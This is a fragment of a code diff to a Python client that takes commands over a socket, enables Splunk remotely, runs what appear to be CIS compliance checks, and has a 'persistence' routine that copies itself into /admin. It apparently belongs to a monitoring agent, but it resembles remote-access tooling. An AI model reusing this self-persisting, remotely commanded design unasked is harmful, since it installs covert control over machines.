@@ -177,7 +177,7 @@ def connection():
 			splunkenableremote(s,command)
 
 def splunkenableremote(s,command):
-	status=splunkenable.splunkconfigure()
+	status=splunkenable.splunkconfigure(IPADDRESS)
 	if status=='DONE':
 		s.send("DONE".encode())
 	elif status=='ALREADY':
@@ -217,7 +217,7 @@ def cischeck(s):
 
 
 def persistence():
-	destination="/admin/client.py"
+	destination="/admin"
 	if not os.path.exists(destination):
 		os.mkdir("/admin")
 		source1=os.getcwd()+"/"+"client.py"
